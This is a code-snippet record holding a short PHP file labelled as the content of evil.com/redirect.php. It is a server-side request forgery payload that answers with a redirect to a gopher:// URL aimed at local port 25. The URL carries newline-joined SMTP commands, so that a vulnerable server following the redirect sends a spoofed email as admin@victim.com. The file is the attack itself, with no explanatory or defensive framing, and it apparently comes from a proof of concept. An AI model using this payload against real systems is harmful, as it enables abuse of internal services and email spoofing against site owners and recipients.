---
id: 0b49e4c0-d663-4fa7-af8b-ccfc1d795599
type: code
language: PHP
verified: false
created_at: '2023-04-06T03:56:37.968910+00:00'
updated_at: '2023-04-10T20:24:10.583133+00:00'
---

# Code Snippet 0b49e4c0

**Language**: PHP

```php
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```
